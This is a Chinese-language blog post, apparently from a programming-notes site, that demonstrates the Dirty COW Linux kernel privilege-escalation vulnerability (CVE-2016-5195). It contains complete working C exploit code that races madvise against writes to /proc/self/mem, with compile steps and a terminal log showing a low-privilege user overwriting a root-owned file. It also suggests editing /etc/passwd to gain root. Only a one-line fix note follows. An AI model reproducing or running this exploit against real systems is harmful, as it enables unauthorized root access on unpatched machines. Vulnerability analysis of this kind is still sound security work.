<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>安全漏洞--linux 最新内核通用提权漏洞利用示例 (脏牛Dirty COW) - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="安全漏洞--linux 最新内核通用提权漏洞利用示例 (脏牛Dirty COW)" />
<meta property="og:description" content="0x01 漏洞简介 Linux内核在处理内存写时拷贝（Copy-on-Write）时存在条件竞争漏洞，导致可以破坏私有只读内存映射。一个低权限的本地用户能够利用此漏洞获取其他只读内存映射的写权限，有可能进一步导致提权漏洞。
CVE-2016-5195: https://access.redhat.com/security/cve/CVE-2016-5195
0x02 漏洞危害 低权限用户可以利用该漏洞修改只读内存，进而执行任意代码获取 root权限。
0x03 影响范围 该漏洞影响所有 Linux Kernel &gt;= 2.6.22的版本。 2.6.22是 2007年发布的版本，也就是说这个漏洞几乎影响 2007以后的所有版本。
0x04 漏洞测试 读取 /proc/version 来获取 LinuxKernel 版本：
0x05 测试代码 /* * main.c * * Created on: Oct 21, 2016 * Author: 5t4rk */ #include&lt;stdio.h&gt; #include&lt;sys/mman.h&gt; #include&lt;fcntl.h&gt; #include&lt;pthread.h&gt; #include&lt;string.h&gt; void *map; int f; struct stat st; char* name; void * madviseThread(void *arg) { char *str; str = (char *) arg; int i, c = 0; for (i = 0; i &lt; 100000000; i&#43;&#43;) { c &#43;= madvise(map, 100, MADV_DONTNEED); } printf(&#34;" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/e5c586fa9c14cccfe77c68033a8da5eb/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2016-10-21T18:24:25+08:00" />
<meta property="article:modified_time" content="2016-10-21T18:24:25+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">安全漏洞--linux 最新内核通用提权漏洞利用示例 (脏牛Dirty COW)</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <h3>0x01 漏洞简介</h3> 
<p><br> </p> 
<p><span style="font-size:18px"><span style="margin:0px; padding:0px">Linux内核在处理内存写时拷贝（Copy-on-Write）时存在条件竞争漏洞，导致可以破坏私有只读内存映射。一个低权限的本地用户能够利用此漏洞获取其他只读内存映射的写权限，有可能进一步导致提权漏洞。</span><br> </span></p> 
<p><span style="margin:0px; padding:0px"><br> </span></p> 
<p><span style="margin:0px; padding:0px"><span style="font-size:18px">CVE-2016-5195: <a target="_blank" href="https://access.redhat.com/security/cve/CVE-2016-5195" rel="nofollow noopener noreferrer">https://access.redhat.com/security/cve/CVE-2016-5195</a></span><br> </span></p> 
<p><span style="margin:0px; padding:0px"><br> </span></p> 
<h3>0x02 漏洞危害</h3> 
<div> 
 <br> 
 <p><span style="font-size:18px">低权限用户可以利用该漏洞修改只读内存，进而执行任意代码获取<span style="font-family:Helvetica"> root</span>权限。</span></p> 
 <p><span style="font-size:14px"><br> </span></p> 
 <h3 style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; clear:both"> 0x03 影响范围</h3> 
 <div> 
  <br> 
 </div> 
 <br> 
 <span style="font-size:18px">该漏洞影响所有<span style="font-family:Helvetica"> Linux Kernel &gt;= 2.6.22</span>的版本。</span> 
 <p style="margin-top:15px; margin-bottom:15px"><span style="font-size:18px"><span style="font-family:Helvetica">2.6.22</span>是<span style="font-family:Helvetica"> 2007</span>年发布的版本，也就是说这个漏洞几乎影响<span style="font-family:Helvetica"> 2007</span>以后的所有版本。</span></p> 
 <br> 
 <h3 style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; clear:both"> <span style="margin:0px; padding:0px">0x04 漏洞测试</span></h3> 
 <p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; clear:both"> <br style="margin:0px; padding:0px"> </p> 
 <p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; clear:both"> <br> </p> 
 <p style=""><span style="font-size:18px">读取<span style="font-family:Helvetica"> </span><span style="border-width:1px; border-style:solid; border-color:rgb(234,234,234); padding:0px; background:none 0% 0% repeat scroll rgb(248,248,248)">/proc/version</span><span style="font-family:Helvetica"> </span>来获取<span style="font-family:Helvetica"> LinuxKernel </span>版本：</span></p> 
 <p style=""><span style="font-size:18px"><br> </span></p> 
 <p style=""><img src="https://images2.imgbox.com/4d/ac/Fsg4jXwz_o.png" alt=""><br> </p> 
 <p style=""><br> </p> 
 <h3 style="">0x05 测试代码</h3> 
 <div> 
  <br> 
 </div> 
 <div> 
  <pre><code class="language-cpp">/*
 * main.c
 *
 *  Created on: Oct 21, 2016
 *      Author: 5t4rk
 */
#include&lt;stdio.h&gt;
#include&lt;sys/mman.h&gt;
#include&lt;fcntl.h&gt;
#include&lt;pthread.h&gt;
#include&lt;string.h&gt;

void *map;
int f;
struct stat st;
char* name;

void * madviseThread(void *arg)
{
	char *str;
	str = (char *) arg;
	int i, c = 0;
	for (i = 0; i &lt; 100000000; i++)
	{
		c += madvise(map, 100, MADV_DONTNEED);
	}
	printf("madvise %d\n", c);
}

void * procselfmemThread(void *arg)
{
	char *str;
	str = (char *) arg;
	int f = open("/proc/self/mem", O_RDWR);
	int i, c = 0;
	for (i = 0; i &lt; 100000000; i++)
	{
		lseek(f, map, SEEK_SET);
		c += write(f, str, strlen(str));
	}
	printf("procselfmem %d\n", c);
}

int main(int argc, char *argv[])
{
	if (argc &lt; 3)
		return 1;
	pthread_t pth1, pth2;
	f = open(argv[1], O_RDONLY);
	fstat(f, &amp;st);
	name = argv[1];
	map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
	printf("mmap %x\n", map);
	pthread_create(&amp;pth1, NULL, madviseThread, argv[1]);
	pthread_create(&amp;pth2, NULL, procselfmemThread, argv[2]);
	pthread_join(pth1, NULL);
	pthread_join(pth2, NULL);
	return 0;
}

</code></pre> 
  <span style="font-size:18px"><br> 编译生成exp<br> <br> </span> 
 </div> 
 <div> 
  <span style="font-size:18px"></span> 
  <pre><code class="language-html">两种生成方式:

命令行编译

gcc main.c -lpthread

集成工具编译

eclipse(luna) +CDT

project&gt;properties&gt;settings&gt;gcc linker&gt; libraries

注意Debug和Release 都同时加上参数pthread库。

再编译即可成功。</code></pre> 
  <div> 
   <span style="font-size:18px"><br> </span> 
  </div> 
  <div> 
   <span style="font-size:18px"><br> </span> 
  </div> 
  <img src="https://images2.imgbox.com/51/1a/VJQKuz79_o.png" alt=""> 
  <br> 
 </div> 
 <div> 
  <br> 
 </div> 
 <div> 
  <br> 
 </div> 
 <div> 
  <h3>0x06 测试结果</h3> 
 </div> 
 <div> 
  <br> 
 </div> 
 <div> 
  <span style="font-size:18px">命令</span> 
 </div> 
 <div> 
  <span style="font-size:18px"><br> </span> 
 </div> 
 <div> 
  <span style="font-size:18px"></span> 
  <pre><code class="language-html">luke@ubuntu:/tmp$ cat test
5678
luke@ubuntu:/tmp$ ls -al test
-rw-r--r-- 1 root root 5 10月 21 17:17 test
luke@ubuntu:/tmp$ id
uid=1000(luke) gid=1000(luke) groups=1000(luke),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
luke@ubuntu:/tmp$ cat test
5678
luke@ubuntu:/tmp$ echo 1234 &gt;test
bash: test: Permission denied
luke@ubuntu:/tmp$ ./rootEep test 1234
bash: ./rootEep: No such file or directory
luke@ubuntu:/tmp$ ./rootExp test 1234
mmap b7701000
madvise 0
procselfmem 400000000
luke@ubuntu:/tmp$ cat test
1234
</code></pre> 
  <br> 
  <br> 
 </div> 
 <div> 
  <img src="https://images2.imgbox.com/80/fc/VD2AKUcs_o.png" alt=""> 
  <br> 
 </div> 
 <div> 
  <span style="font-size:18px"><br> </span> 
 </div> 
 <div> 
  <span style="font-size:18px"><br> </span> 
 </div> 
 <div> 
  <span style="font-size:18px">结果显示低权限用户修改了root用户创建的文件内容。同理，</span> 
 </div> 
 <div> 
  <p style="margin-top:15px; margin-bottom:15px"><span style="font-size:18px">可以看到结果，<span style="font-family:Helvetica">test </span>文件的内容已经由5678被成功修改为1234。</span></p> 
  <p style="margin-top:15px; margin-bottom:15px"><span style="font-size:18px">这样的话，只要修改<span style="font-family:Helvetica"> /etc/passwd </span>把当前用户的<span style="font-family:Helvetica"> uid </span>改成<span style="font-family:Helvetica"> 0 </span>就可以作为<span style="font-family:Helvetica"> root </span>登录</span><span style="font-size:14px">了。</span></p> 
  <br> 
 </div> 
 <div> 
  <br> 
 </div> 
 <h3><span style="font-size:24px">0x07 修复方案</span><span style="font-size:18px"><br> </span></h3> 
 <div> 
  <span style="font-size:18px"><br> </span> 
 </div> 
 <div> 
  <p style="margin-top:15px; margin-bottom:15px"><span style="font-size:18px">更新升级最新 Linux Kernel 源码，并重新编译。</span><br> </p> 
  <br> 
 </div> 
 <div> 
  <br> 
 </div> 
 <br> 
</div>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/cb567997c37f3a37c104bd4cee20b016/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">匹配中文字符的正则表达式</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/cfd4edf8edde1b8ddea07b2837afc976/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">Java三大器之监听器（Listener）的工作原理和代码演示</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>